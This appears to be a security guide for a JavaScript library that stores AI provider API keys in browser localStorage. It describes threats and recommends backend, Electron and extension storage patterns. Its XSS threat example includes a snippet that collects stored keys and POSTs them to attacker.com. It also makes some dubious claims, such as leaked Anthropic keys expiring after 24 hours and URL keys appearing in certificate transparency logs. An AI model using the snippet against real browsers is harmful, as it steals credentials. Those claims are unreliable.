# Security Considerations for @ulam/halohalo

This document outlines security best practices when using halohalo to store and manage API keys.

---

## âš ï¸ API Key Storage

### Default Behavior (Development Only)

By default, halohalo stores API keys in browser `localStorage` in plain text:

```javascript
// Under the hood
localStorage.setItem('apikey_anthropic', 'sk-ant-...')
```

**This is NOT secure for production web applications.**

### Why localStorage?

Browser JavaScript has no access to secure storage mechanisms (secure enclave, TPM, OS keychain). The `localStorage` abstraction layer is designed for **demos, prototypes, and educational applications**.

---

## âš ï¸ Threats & Mitigations

### Threat 1: XSS Attack Exposes All Keys

**Scenario**: Attacker injects malicious JavaScript via compromised dependency or XSS vulnerability.

```javascript
// Attacker code (would run in user's browser)
const apiKeys = Object.keys(localStorage)
  .filter(k => k.includes('apikey'))
  .map(k => ({ key: k, value: localStorage[k] }))

// Send to attacker's server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(apiKeys)
})
```

**Mitigation**: Store keys in a backend service, not browser.

---

### Threat 2: Shared Browser Device

**Scenario**: Multiple users share a browser (public library, shared computer).

```javascript
// User A logs out
// User B opens browser DevTools â†’ Application â†’ Local Storage
// Sees all of User A's API keys
```

**Mitigation**: Use HTTP-only cookies or encrypted backend storage.

---

### Threat 3: Browser History / Access Logs

**Scenario**: Google provider embeds key in URL query parameter (line 64 in providers.js).

```text
https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5:generateContent?key=AIzaSy...
```

**Log locations**:

- Browser history
- Server access logs
- CDN/WAF logs
- Certificate transparency logs
- ISP traffic monitoring
- DNS resolver logs

**Mitigation**: Use Authorization header in request body (Anthropic/OpenAI pattern).

---

## âœ… Safe Usage Patterns

### Pattern 1: Backend API Proxy (Recommended for Web Apps)

**Architecture**:

- Client: Sends request to your backend
- Backend: Validates user, holds API key in environment variable, calls provider
- Response: Proxied back to client

**Benefits**:

- API keys never exposed to browser
- Rate limiting per user
- Billing tied to your account
- Audit trail of API usage

**Example**:

```javascript
// Client-side (halohalo not needed, but could be)
const response = await fetch('/api/ai/complete', {
  method: 'POST',
  body: JSON.stringify({ prompt: 'Hello' })
})

// Server-side (Node.js example)
app.post('/api/ai/complete', async (req, res) => {
  const { prompt } = req.body
  const apiKey = process.env.ANTHROPIC_API_KEY // From env, never in code

  const completion = await createCompletion(prompt, {
    provider: 'anthropic',
    apiKey,
    model: 'claude-sonnet-4-6'
  })

  res.json({ completion })
})
```

---

### Pattern 2: Electron App (Recommended for Desktop)

**Architecture**:

- Store API keys in Electron secure storage
- Main process handles all API calls
- Renderer process sends requests via IPC

**Benefits**:

- Keys stored encrypted on disk (OS keychain)
- JavaScript isolation (main vs renderer)
- No browser DevTools access to storage
- Transparent to user security model

**Example**:

```javascript
// Main process
const { ipcMain } = require('electron')
const { createCompletion } = require('@ulam/halohalo/core')
const keytar = require('keytar') // npm install keytar

ipcMain.handle('ai:complete', async (event, prompt) => {
  const apiKey = await keytar.getPassword('app', 'anthropic-key')
  return createCompletion(prompt, { provider: 'anthropic', apiKey, ... })
})

// Renderer process
const response = await window.ipcRenderer.invoke('ai:complete', 'Hello')
```

---

### Pattern 3: Browser Extension (Recommended for Automation)

**Architecture**:

- Store API keys in `chrome.storage.sync` (encrypted at rest)
- Service worker handles requests
- Content scripts send messages to service worker

**Benefits**:

- Chrome encrypts storage automatically
- Scoped permissions (only your extension can access)
- Survives browser restarts
- Syncs across devices

**Example**:

```javascript
// service-worker.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'complete') {
    chrome.storage.sync.get('anthropic_key', async ({ anthropic_key }) => {
      const completion = await createCompletion(request.prompt, {
        provider: 'anthropic',
        apiKey: anthropic_key,
        ...
      })
      sendResponse({ completion })
    })
  }
})

// content-script.js
chrome.runtime.sendMessage(
  { action: 'complete', prompt: userInput },
  ({ completion }) => console.log(completion)
)
```

---

### Pattern 4: Development / Demo (What halohalo Does)

**Use Case**: Learning, prototyping, short-lived demos

**Setup**:

```javascript
// Use throw-away test key from provider dashboard
// Apply strict rate limits to test key
// Delete key after demo ends
// Never commit keys to git

const config = {
  provider: 'anthropic',
  apiKey: 'sk-ant-demo-key-only', // From provider's test key section
  model: 'claude-3-5-sonnet-20241022'
}

const response = await createCompletion('Hello', config)
```

**Safety**:

- Test keys have strict rate limits (10 requests/min)
- No production data exposed
- Easy to revoke and replace
- Test APIs often use credits/free tier

---

## âŒ Do NOT

- âŒ **Store real API keys in localStorage** in production web apps
- âŒ **Commit API keys to git** (ever, even in example code)
- âŒ **Log API keys** in console or to third-party services
- âŒ **Embed keys in client-side config files** (.env.local, config.js, etc.)
- âŒ **Use environment variables set at build time** for browser apps
- âŒ **Embed Google/OpenAI keys in URLs** (they appear in logs)

---

## âœ… Do

- âœ… **Use environment variables in backend** (`process.env.API_KEY` in Node.js)
- âœ… **Proxy all API calls through your backend** for web applications
- âœ… **Use platform-specific secure storage** (Electron, Extension, Native app)
- âœ… **Rotate keys regularly** and monitor for leaks
- âœ… **Set rate limits and budgets** on all API keys
- âœ… **Use separate keys for development/staging/production**
- âœ… **Document your architecture** so team members follow secure patterns

---

## Checking If You've Leaked a Key

If you suspect an API key has been exposed:

1. **Anthropic**: Immediately revoke the key in the dashboard
   - Leaked keys expire automatically after 24 hours anyway
   - Monitor billing for unauthorized usage

2. **OpenAI**: Revoke immediately in account settings
   - Set up billing alerts
   - Check usage logs for unauthorized requests

3. **Google**: Revoke in Google Cloud Console
   - Delete compromised key
   - Create new key for legitimate use

4. **All Providers**: Check if key was committed to git

   ```bash
   git log -S "sk-ant-" # Search git history for key
   git log -S "AIzaSy" # Google keys
   ```

   If found in history, you must rotate (history is permanent).

---

## For halohalo Contributors

If you modify credential storage or API handling:

1. **Review** this document
2. **Maintain** the platform adapter abstraction
3. **Never hardcode** keys or credentials
4. **Test** with throw-away keys only
5. **Document** security implications in your PR

---

## Questions?

- **Security issue?** File a GitHub issue marked `[SECURITY]`
- **Design question?** See `packages/sawsawan/platformAdapter.js` for the storage abstraction
- **Usage question?** See patterns above or refer to specific framework guides

---

## Related Reading

- [OWASP: Storing Sensitive Data in the Browser](https://owasp.org/www-community/attacks/Sensitive_Data_Exposure)
- [Chrome Security Best Practices](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Electron Security](https://www.electronjs.org/docs/tutorial/security)
- [AWS: Secrets Management](https://aws.amazon.com/secrets-manager/getting-started/)
